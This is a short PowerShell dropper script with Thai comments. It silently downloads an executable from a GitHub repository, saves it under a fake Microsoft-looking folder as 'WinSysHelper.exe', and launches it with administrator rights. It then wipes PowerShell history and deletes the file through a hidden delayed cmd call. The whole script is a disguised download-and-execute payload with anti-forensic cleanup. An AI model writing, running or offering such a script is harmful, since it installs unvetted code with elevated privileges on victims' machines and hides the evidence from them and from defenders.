$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# 1. ตั้งที่อยู่ใหม่ (ซ่อนเนียนใน LocalAppData ไม่ต้องขอสิทธิ์สร้าง)
$dir = "$env:LOCALAPPDATA\Microsoft\Windows\WinSig"
if (-not (Test-Path $dir)) { New-Item -Path $dir -ItemType Directory -Force | Out-Null }
$output = "$dir\WinSysHelper.exe"

# 2. โหลดไฟล์จาก GitHub ของบาส
$url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe"
Invoke-WebRequest -Uri $url -OutFile $output

# 3. รันแบบ Admin (เด้ง UAC แน่นอน)
Start-Process -FilePath $output -Verb RunAs

# 4. จัดการเรื่องประวัติ (ล่องหน)
try { Set-PSReadlineOption -HistorySaveStyle SaveNothing } catch {}
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force

# 5. สั่งลบไฟล์ทิ้งแบบหน่วงเวลา (ใช้ CMD ช่วยรันเบื้องหลัง)
# รอ 15 วินาทีเพื่อให้มั่นใจว่า EXE บาสรันขึ้นมาแล้วค่อยลบตัวมันเองทิ้ง
$cleanup = "timeout /t 15 && del /f /q `"$output`""
Start-Process cmd -ArgumentList "/c $cleanup" -WindowStyle Hidden

exit
